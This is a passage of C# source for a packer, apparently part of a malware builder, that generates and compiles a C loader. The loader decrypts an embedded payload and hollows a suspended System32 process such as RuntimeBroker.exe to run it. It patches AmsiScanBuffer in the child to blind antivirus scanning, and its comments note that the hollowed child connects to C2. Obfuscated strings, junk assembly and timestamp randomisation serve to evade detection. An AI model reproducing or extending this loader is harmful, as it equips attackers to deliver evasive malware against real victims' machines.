    unsigned char* out=(unsigned char*)g_VA(NULL,out_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!out) { fClDc(hDec); return NULL; }
    SIZE_T final=0;
    BOOL ok=fDcmp(hDec,(PVOID)src,src_len,out,out_len,&final);
    fClDc(hDec);
    if (!ok||final!=out_len) { g_VF(out,0,MEM_RELEASE); return NULL; }
    return out;
}

/* Hollow target process and inject stub PE */
static int {{fnHol}}(unsigned char* pe, unsigned int pe_len) {
    if(!g_CPA||!g_VAEx||!g_VPEx||!g_WPM||!g_GTC||!g_STC||!g_RTh||!g_TPA||!g_CH||!g_VA||!g_VF) return 0;
    (void)pe_len;
    IMAGE_DOS_HEADER* dos=(IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic!=0x5A4D) return 0;
    IMAGE_NT_HEADERS64* nt=(IMAGE_NT_HEADERS64*)(pe+dos->e_lfanew);
    if (nt->Signature!=0x00004550) return 0;
    ULONG_PTR preferred=(ULONG_PTR)nt->OptionalHeader.ImageBase;
    DWORD imgSz=nt->OptionalHeader.SizeOfImage;
    DWORD epRva=nt->OptionalHeader.AddressOfEntryPoint;
    /* Set env var so hollowed child skips re-hollow and connects to C2 */
    unsigned char _ek[12]; memcpy(_ek,{{sHKey.Var}},{{sHKey.Len}}); _xd(_ek,{{sHKey.Len}},0x{{sHKey.Key:X2}});
    unsigned char _ev[4];  memcpy(_ev,{{sHVal.Var}},{{sHVal.Len}}); _xd(_ev,{{sHVal.Len}},0x{{sHVal.Key:X2}});
    g_SEV((LPCSTR)_ek,(LPCSTR)_ev);
    /* Build System32\target path */
    char tpath[MAX_PATH]={0};
    g_GSD(tpath,MAX_PATH);
    int sd=0; while(tpath[sd]) sd++;
    tpath[sd++]='\\';
    unsigned char _tn[{{sHTgt.Len + 1}}]; memcpy(_tn,{{sHTgt.Var}},{{sHTgt.Len}}); _xd(_tn,{{sHTgt.Len}},0x{{sHTgt.Key:X2}});
    int ti=0; while(_tn[ti]) { tpath[sd++]=(char)_tn[ti++]; }
    tpath[sd]=0;
    /* Create target process suspended */
    STARTUPINFOA si; memset(&si,0,sizeof(si)); si.cb=sizeof(si);
    PROCESS_INFORMATION pi; memset(&pi,0,sizeof(pi));
    if (!g_CPA(tpath,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) return 0;
    /* Alloc RW region in remote process — no PAGE_EXECUTE_READWRITE */
    LPVOID rem=g_VAEx(pi.hProcess,(LPVOID)preferred,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
    if (!rem) rem=g_VAEx(pi.hProcess,NULL,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
    if (!rem) { g_TPA(pi.hProcess,0); g_CH(pi.hThread); g_CH(pi.hProcess); return 0; }
    ULONG_PTR remBase=(ULONG_PTR)rem;
    /* Build local mapped image */
    unsigned char* img=(unsigned char*)g_VA(NULL,imgSz,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
    if (!img) { g_TPA(pi.hProcess,0); g_CH(pi.hThread); g_CH(pi.hProcess); return 0; }
    memcpy(img,pe,nt->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)((UCHAR*)nt+sizeof(IMAGE_NT_HEADERS64));
    for (int i=0;i<nt->FileHeader.NumberOfSections;i++)
        if (sec[i].SizeOfRawData) memcpy(img+sec[i].VirtualAddress,pe+sec[i].PointerToRawData,sec[i].SizeOfRawData);
    /* Apply base relocations if needed */
    ULONG_PTR delta=remBase-preferred;
    if (delta&&nt->OptionalHeader.DataDirectory[5].Size) {
        IMAGE_BASE_RELOCATION* rel=(IMAGE_BASE_RELOCATION*)(img+nt->OptionalHeader.DataDirectory[5].VirtualAddress);
        while(rel->VirtualAddress) {
            WORD* e=(WORD*)((UCHAR*)rel+sizeof(IMAGE_BASE_RELOCATION));
            DWORD n=(rel->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
            for(DWORD j=0;j<n;j++) {
                int t=e[j]>>12; DWORD off=e[j]&0xFFF;
                if(t==10) { ULONG_PTR* p=(ULONG_PTR*)(img+rel->VirtualAddress+off); *p+=delta; }
                else if(t==3) { DWORD* p=(DWORD*)(img+rel->VirtualAddress+off); *p+=(DWORD)delta; }
            }
            rel=(IMAGE_BASE_RELOCATION*)((UCHAR*)rel+rel->SizeOfBlock);
        }
    }
    /* Write image to remote, then flip to RX — no persistent RWX page */
    SIZE_T wr=0; g_WPM(pi.hProcess,rem,img,imgSz,&wr);
    g_VF(img,0,MEM_RELEASE);
    DWORD oldProt=0;
    g_VPEx(pi.hProcess,rem,imgSz,PAGE_EXECUTE_READ,&oldProt);
    /* Update PEB.ImageBase and redirect entry point */
    CONTEXT ctx; memset(&ctx,0,sizeof(ctx)); ctx.ContextFlags=CONTEXT_FULL;
    if (!g_GTC(pi.hThread,&ctx)) {
        g_TPA(pi.hProcess,0); g_CH(pi.hThread); g_CH(pi.hProcess); return 0;
    }
    ULONG_PTR peb=(ULONG_PTR)ctx.Rdx;
    g_WPM(pi.hProcess,(LPVOID)(peb+0x10),&remBase,sizeof(remBase),NULL);
    ctx.Rip=remBase+epRva;
    g_STC(pi.hThread,&ctx);
    /* AMSI bypass: load amsi.dll in this process (same ASLR base as child),
       force-load it in child via remote thread, then patch AmsiScanBuffer */
    if(g_LLA&&g_CRT&&g_WSO&&g_VPEx&&g_WPM&&g_VAEx&&g_VF){
        unsigned char _ad[10]; memcpy(_ad,{{sAmsiD.Var}},{{sAmsiD.Len}}); _xd(_ad,{{sAmsiD.Len}},0x{{sAmsiD.Key:X2}});
        HMODULE hAmsi=(HMODULE)g_LLA((LPCSTR)_ad);
        if(hAmsi){
            unsigned char _af[16]; memcpy(_af,{{sAmsiF.Var}},{{sAmsiF.Len}}); _xd(_af,{{sAmsiF.Len}},0x{{sAmsiF.Key:X2}});
            FARPROC pASB=_manu_gpa(hAmsi,(const char*)_af);
            if(pASB){
                /* Force amsi.dll into child so same VA is mapped there */
                LPVOID rStr=g_VAEx(pi.hProcess,NULL,16,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
                if(rStr){
                    g_WPM(pi.hProcess,rStr,_ad,10,NULL);
                    HANDLE hT=g_CRT(pi.hProcess,NULL,0,(LPTHREAD_START_ROUTINE)(LPVOID)g_LLA,rStr,0,NULL);
                    if(hT){g_WSO(hT,5000);g_CH(hT);}
                    g_VF(rStr,0,MEM_RELEASE);
                }
                /* Patch AmsiScanBuffer: set *result=AMSI_RESULT_CLEAN, return S_OK */
                static BYTE _ap[]={0x48,0x8B,0x44,0x24,0x30,0xC7,0x00,0x01,0x00,0x00,0x00,0x33,0xC0,0xC3};
                DWORD _op=0;
                g_VPEx(pi.hProcess,(LPVOID)pASB,sizeof(_ap),PAGE_EXECUTE_READWRITE,&_op);
                g_WPM(pi.hProcess,(LPVOID)pASB,_ap,sizeof(_ap),NULL);
                g_VPEx(pi.hProcess,(LPVOID)pASB,sizeof(_ap),_op,&_op);
            }
        }
    }
    g_RTh(pi.hThread);
    g_CH(pi.hThread);
    g_CH(pi.hProcess);
    return 1;
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    (void)h; (void)p; (void)cmd; (void)show;
    {{fnRes}}();
    if(!g_VA||!g_VF) return 1;
    volatile unsigned int  _dc={{fnJunk}}(g_GCPID?(g_GCPID()):0); (void)_dc;
    volatile unsigned long long _d1={{fnAsm1}}(); (void)_d1;
    volatile unsigned long long _d2={{fnAsm2}}(); (void)_d2;
    volatile unsigned long long _d3={{fnAsm3}}(); (void)_d3;
    /* Load payload from embedded resource (RT_RCDATA id 101) */
    HRSRC hR=FindResource(NULL,MAKEINTRESOURCE(101),RT_RCDATA);
    if(!hR) return 1;
    HGLOBAL hG=LoadResource(NULL,hR);
    if(!hG) return 1;
    const unsigned char* g_enc=(const unsigned char*)LockResource(hG);
    unsigned int g_enc_len=SizeofResource(NULL,hR);
    if(!g_enc||!g_enc_len) return 1;
    unsigned int plainLen=0;
    unsigned char* compressed={{fnAes}}(g_enc,g_enc_len,&plainLen);
    if (!compressed) return 1;
    unsigned char* stub_pe={{fnDcmp}}(compressed,(SIZE_T)plainLen,(SIZE_T)g_org_size);
    g_VF(compressed,0,MEM_RELEASE);
    if (!stub_pe) return 1;
    {{fnHol}}(stub_pe,g_org_size);
    g_VF(stub_pe,0,MEM_RELEASE);
    return 0;
}
""";
    }

    // ── Randomise PE timestamp ────────────────────────────────────────────────────

    private static void RandomisePeTimestamp(string exePath)
    {
        try
        {
            var bytes = File.ReadAllBytes(exePath);
            if (bytes.Length < 0x40) return;
            int peOff = BitConverter.ToInt32(bytes, 0x3C);
            if (peOff + 8 > bytes.Length || bytes[peOff] != 'P' || bytes[peOff + 1] != 'E') return;
            BitConverter.GetBytes((uint)Random.Shared.Next()).CopyTo(bytes, peOff + 8);
            File.WriteAllBytes(exePath, bytes);
        }
        catch { }
    }

    // ── Tool helpers ─────────────────────────────────────────────────────────────

    private static string? FindRcExe(Dictionary<string, string> vsEnv)
    {
        if (vsEnv.TryGetValue("WindowsSdkBinPath", out var binPath) &&
            vsEnv.TryGetValue("WindowsSDKVersion", out var sdkVer))
        {
            // vcvarsall sets WindowsSDKVersion with a trailing backslash
            sdkVer = sdkVer.TrimEnd('\\', '/');
            var rc = Path.Combine(binPath, sdkVer, "x64", "rc.exe");
            if (File.Exists(rc)) return rc;
        }
        var kits = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Windows Kits", "10", "bin");
        if (Directory.Exists(kits))
            foreach (var ver in Directory.GetDirectories(kits).OrderByDescending(x => x))
            {
                var rc = Path.Combine(ver, "x64", "rc.exe");
                if (File.Exists(rc)) return rc;
            }
        return null;
    }

    private static async Task<bool> RunAsync(
        string exe, string args,
        Dictionary<string, string>? env,
        Action<string> log,
        string label)
    {
        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName               = exe,
            Arguments              = args,
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            UseShellExecute        = false,
            CreateNoWindow         = true,
        };
        if (env != null) foreach (var kv in env) psi.Environment[kv.Key] = kv.Value;
        using var proc = System.Diagnostics.Process.Start(psi)!;
        var stdout = await proc.StandardOutput.ReadToEndAsync();
        var stderr = await proc.StandardError.ReadToEndAsync();
        await proc.WaitForExitAsync();
        if (proc.ExitCode != 0)
        {
            log($"[!] CustomPacker: {label} failed (exit {proc.ExitCode})");
            if (!string.IsNullOrWhiteSpace(stdout)) log(stdout.TrimEnd());
            if (!string.IsNullOrWhiteSpace(stderr)) log(stderr.TrimEnd());
            return false;
        }
        return true;
    }

    // ── Public entry point ────────────────────────────────────────────────────────

    public static async Task ApplyAsync(
        string exePath,
        Action<string> log,
        string?         iconPath     = null,
        LoaderMetadata? meta         = null,
        string          hollowTarget = "RuntimeBroker.exe")
    {
        log("[*] CustomPacker: Starting...");
        byte[] raw = await File.ReadAllBytesAsync(exePath);
        log($"[*] CustomPacker: Input {raw.Length / 1024:N0} KB");

        var uiCtx = SynchronizationContext.Current;
        Action<string> uiLog = uiCtx is null ? log : msg => uiCtx.Post(_ => log(msg), null);

        var (compressed, cipher, key, iv) = await Task.Run(() =>
        {
            var c = Compress(raw, uiLog);
            var (ci, k, i) = EncryptAes(c);
            return (c, ci, k, i);
        });
        log($"[*] CustomPacker: AES-256-CBC encrypted ({cipher.Length / 1024:N0} KB)");

        var (asmSrc, fn1, fn2, fn3) = GenerateAsmJunk();
        string loaderSrc = GenerateLoaderSource(cipher, key, iv,
            (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3, hollowTarget);
        // cipher is written as a resource blob — no longer embedded in C .data section

        string? clPath = await Task.Run(() => FindClExe(log));
        if (clPath == null) { log("[!] CustomPacker: cl.exe not found — skipped."); return; }

        var ml64Path = Path.Combine(Path.GetDirectoryName(clPath)!, "ml64.exe");
        if (!File.Exists(ml64Path))
        {
            log("[!] CustomPacker: ml64.exe not found alongside cl.exe — skipped.");
            return;
        }

        var vsEnv = await Task.Run(() => GetVsEnvironment(clPath));
        var tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
        Directory.CreateDirectory(tempDir);
        try
        {
            // 1. Compile ASM junk → junk.obj
            var asmPath = Path.Combine(tempDir, "junk.asm");
            var objPath = Path.Combine(tempDir, "junk.obj");
            await File.WriteAllTextAsync(asmPath, asmSrc);
            var ok = await RunAsync(ml64Path,
                $"/nologo /c /Fo\"{objPath}\" \"{asmPath}\"",
                vsEnv, log, "ml64");
            if (!ok || !File.Exists(objPath)) return;
            log("[+] CustomPacker: x64 ASM junk compiled.");

            // 2. Always compile RC: payload blob (RCDATA 101) + optional icon/version
            string resArg = "";
            {
                var payloadBin = Path.Combine(tempDir, "payload.bin");
                await File.WriteAllBytesAsync(payloadBin, cipher);

                var rcExe = vsEnv != null ? FindRcExe(vsEnv) : null;
                if (rcExe != null)
                {
                    var rcSrc  = Path.Combine(tempDir, "loader.rc");
                    var resOut = Path.Combine(tempDir, "loader.res");
                    await File.WriteAllTextAsync(rcSrc,
                        GenerateResourceSource(iconPath, meta, Path.GetFileName(exePath), payloadBin));
                    ok = await RunAsync(rcExe,
                        $"/nologo /fo \"{resOut}\" \"{rcSrc}\"",
                        vsEnv, log, "rc");
                    if (ok && File.Exists(resOut))
                    {
                        resArg = $" \"{resOut}\"";
                        log("[+] CustomPacker: resource (payload + icon/version) compiled.");
                    }
                    else
                        log("[!] CustomPacker: rc.exe failed — cannot embed payload resource.");
                }
                else
                    log("[!] CustomPacker: rc.exe not found — payload resource unavailable.");
            }

            // 3. Compile C loader + link junk.obj [+ loader.res]
            var srcPath = Path.Combine(tempDir, "loader.c");
            var outPath = Path.Combine(tempDir, "loader.exe");
            await File.WriteAllTextAsync(srcPath, loaderSrc);

            ok = await RunAsync(clPath,
                $"\"{srcPath}\" \"{objPath}\"{resArg} /O2 /MT /W0 /nologo " +
                $"/Fe\"{outPath}\" kernel32.lib " +
                "/link /SUBSYSTEM:WINDOWS /INCREMENTAL:NO /OPT:REF /OPT:ICF",
                vsEnv, log, "cl");
            if (!ok || !File.Exists(outPath)) return;

            RandomisePeTimestamp(outPath);

            var packedSize = new FileInfo(outPath).Length;
            var ratio = 100.0 * packedSize / raw.Length;
            log($"[+] CustomPacker: {raw.Length / 1024:N0} KB → {packedSize / 1024:N0} KB ({ratio:F0}% of original)");
            File.Copy(outPath, exePath, overwrite: true);
            log($"[+] CustomPacker: Applied to {Path.GetFileName(exePath)}");
        }
        finally { try { Directory.Delete(tempDir, true); } catch { } }
    }

    // ── cl.exe / VS environment helpers ──────────────────────────────────────────

    private static string? FindClExe(Action<string>? log = null)
    {
        var vswhere = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Microsoft Visual Studio", "Installer", "vswhere.exe");

        if (File.Exists(vswhere))
        {
            foreach (var args in new[]
            {
                @"-latest -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-latest -prerelease -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-all -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
            })
            {
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo(vswhere, args)
                        { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = System.Diagnostics.Process.Start(psi)!;
                    string? line;
                    while ((line = p.StandardOutput.ReadLine()?.Trim()) != null)
                    {
                        p.WaitForExit(5000);
                        if (!string.IsNullOrEmpty(line) && File.Exists(line)) return line;
                    }
                }
                catch { }
            }
        }

        foreach (var pf in new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
        })
        {
            var vsBase = Path.Combine(pf, "Microsoft Visual Studio");
            if (!Directory.Exists(vsBase)) continue;
            foreach (var verDir in Directory.GetDirectories(vsBase).OrderByDescending(x => x))
                foreach (var ed in Directory.GetDirectories(verDir).OrderByDescending(x => x))
                {
                    var msvc = Path.Combine(ed, "VC", "Tools", "MSVC");
                    if (!Directory.Exists(msvc)) continue;
                    foreach (var v in Directory.GetDirectories(msvc).OrderByDescending(x => x))
                    {
                        var cl = Path.Combine(v, "bin", "Hostx64", "x64", "cl.exe");
                        if (File.Exists(cl)) return cl;
                    }
                }
        }

        log?.Invoke("[!] cl.exe not found. Install VS 2022/2025 with C++ Desktop workload.");
        return null;
    }

    private static Dictionary<string, string>? GetVsEnvironment(string clExePath)
    {
        try
        {
            var dir = Path.GetDirectoryName(clExePath)!;
            for (int i = 0; i < 6; i++)
            {
                dir = Path.GetDirectoryName(dir) ?? "";
                var vcvars = Path.Combine(dir, "Auxiliary", "Build", "vcvarsall.bat");
                if (!File.Exists(vcvars)) continue;
                if (vcvars.IndexOfAny(new[] { '"', '&', '|', '>', '<', ';', '%', '!', '^' }) >= 0) continue;
                var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe",
                    $"/c \"\"{vcvars}\" amd64 && set\"")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute  = false,
                    CreateNoWindow   = true,
                };
                using var p = System.Diagnostics.Process.Start(psi)!;
                var env = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                string? line;
                while ((line = p.StandardOutput.ReadLine()) != null)
                {
                    int eq = line.IndexOf('=');
                    if (eq > 0) env[line[..eq]] = line[(eq + 1)..];
                }
                p.WaitForExit(15000);
                if (env.Count > 0) return env;
            }
        }
        catch { }
        return null;
    }
}
